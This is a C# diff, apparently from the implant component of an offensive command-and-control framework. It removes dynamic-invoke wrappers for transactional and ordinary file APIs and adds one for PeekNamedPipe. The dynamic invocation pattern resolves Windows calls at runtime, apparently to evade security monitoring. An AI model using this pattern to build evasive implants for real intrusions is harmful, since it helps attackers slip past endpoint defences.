@@ -48,35 +48,18 @@ namespace Drone.Invocation.DynamicInvoke
                 return retVal;
             }
 
-            public static IntPtr CreateFileTransactedW([MarshalAs(UnmanagedType.LPWStr)] string lpFileName,
-                uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition,
-                uint dwFlagsAndAttributes, IntPtr hTemplateFile, IntPtr hTransaction, ref ushort pusMiniVersion,
-                IntPtr nullValue)
+            public static bool PeekNamedPipe(IntPtr pipeHandle, ref uint bytesToRead)
             {
-                object[] funcargs =
+                var parameters = new object[]
                 {
-                    lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition,
-                    dwFlagsAndAttributes, hTemplateFile, hTransaction, pusMiniVersion, nullValue
+                    pipeHandle, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, bytesToRead, IntPtr.Zero
                 };
+                
+                var result = (bool)Generic.DynamicAPIInvoke(@"kernel32.dll", @"PeekNamedPipe",
+                    typeof(Delegates.PeekNamedPipe), ref parameters);
 
-                var retVal = (IntPtr)Generic.DynamicAPIInvoke(@"Kernel32.dll", @"CreateFileTransactedW",
-                    typeof(Delegates.CreateFileTransactedW), ref funcargs);
-
-                return retVal;
-            }
-
-            public static bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
-                ref uint lpNumberOfBytesWritten, IntPtr lpOverlapped)
-            {
-                object[] funcargs =
-                {
-                    hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped
-                };
-
-                var retVal = (bool)Generic.DynamicAPIInvoke(@"Kernel32.dll", @"WriteFile",
-                    typeof(Delegates.WriteFile), ref funcargs);
-
-                return retVal;
+                bytesToRead = (uint)parameters[4];
+                return result;
             }
         }
 
@@ -199,79 +182,6 @@ namespace Drone.Invocation.DynamicInvoke
             }
         }
 
-        public static class KernelBase
-        {
-            public static IntPtr CreateFileW(
-                [MarshalAs(UnmanagedType.LPWStr)] string lpFileName, uint dwDesiredAccess, uint dwShareMode,
-                IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes,
-                IntPtr hTemplateFile)
-            {
-                object[] funcargs =
-                {
-                    lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes,
-                    dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile
-                };
-
-                var retVal = (IntPtr)Generic.DynamicAPIInvoke(@"KernelBase.dll", @"CreateFileW",
-                    typeof(Delegates.CreateFileW), ref funcargs);
-
-                return retVal;
-            }
-
-            public static uint GetFileAttributesW(IntPtr lpFileName)
-            {
-                object[] funcargs = { lpFileName };
-
-                var retVal = (uint)Generic.DynamicAPIInvoke(@"KernelBase.dll", @"GetFileAttributesW",
-                    typeof(Delegates.GetFileAttributesW), ref funcargs);
-
-                return retVal;
-            }
-
-            public static bool GetFileAttributesExW(IntPtr lpFileName, uint fInfoLevelId, ref IntPtr lpFileInformation)
-            {
-                object[] funcargs = { lpFileName, fInfoLevelId, lpFileInformation };
-
-                var retVal = (bool)Generic.DynamicAPIInvoke(@"KernelBase.dll", @"GetFileAttributesExW",
-                    typeof(Delegates.GetFileAttributesExW), ref funcargs);
-
-                lpFileInformation = (IntPtr)funcargs[2];
-
-                return retVal;
-            }
-
-            public static bool GetFileInformationByHandle(IntPtr hFile, ref IntPtr lpFileInformation)
-            {
-                object[] funcargs = { hFile, lpFileInformation };
-
-                var retVal = (bool)Generic.DynamicAPIInvoke(@"KernelBase.dll", @"GetFileInformationByHandle",
-                    typeof(Delegates.GetFileInformationByHandle), ref funcargs);
-
-                lpFileInformation = (IntPtr)funcargs[1];
-
-                return retVal;
-            }
-        }
-
-        public static class Ktmw32
-        {
-            public static IntPtr CreateTransaction(IntPtr lpTransactionAttributes, IntPtr uow, int createOptions,
-                int isolationLevel, int isolationFlags, int timeout,
-                [MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder description)
-            {
-                object[] funcargs =
-                {
-                    lpTransactionAttributes, uow, createOptions, isolationLevel, isolationFlags,
-                    timeout, description
-                };
-
-                var retVal = (IntPtr)Generic.DynamicAPIInvoke(@"ktmw32.dll", @"CreateTransaction",
-                    typeof(Delegates.CreateTransaction), ref funcargs, true);
-
-                return retVal;
-            }
-        }
-
         public static class Delegates
         {
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
@@ -391,6 +301,15 @@ namespace Drone.Invocation.DynamicInvoke
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
             public delegate bool CloseServiceHandle(IntPtr hSCObject);
+            
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate bool PeekNamedPipe(
+                IntPtr handle,
+                IntPtr buffer,
+                IntPtr nBufferSize,
+                IntPtr bytesRead,
+                ref uint bytesAvail,
+                IntPtr bytesLeftThisMessage);
         }
     }
 }
